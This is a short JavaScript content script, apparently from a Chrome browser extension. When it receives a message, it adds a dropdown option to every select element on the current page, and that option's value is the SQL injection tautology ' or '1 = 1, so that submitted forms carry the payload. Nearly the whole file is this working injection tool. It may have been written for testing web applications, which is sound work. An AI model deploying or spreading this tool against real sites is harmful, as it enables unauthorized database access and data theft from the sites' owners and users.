'use strict';

function dropdownInject(){
  //Gather all the dropdown lists
  var dropdowns = document.getElementsByTagName('select');

  //If there are no dropdowns to inject, stop
  if (dropdowns.length == 0){
    alert("There are no dropdowns to inject into.");
    return;
  }

  //Set injection tactic
  var injectionString = "<option value = \"\' or \'1 = 1\">Inject</option>"
  //Replace dropdown option with injection
  for (var i = 0, l = dropdowns.length; i < l; i++) {
    dropdowns[i].innerHTML = injectionString + dropdowns[i].innerHTML;
  }
  alert("Injected");
}


chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    //alert(request.message);
    if (request.message === "inject_to_dropdowns"){
      dropdownInject();
      chrome.runtime.sendMessage({"message": "Injection Completed"})
    }
  }
);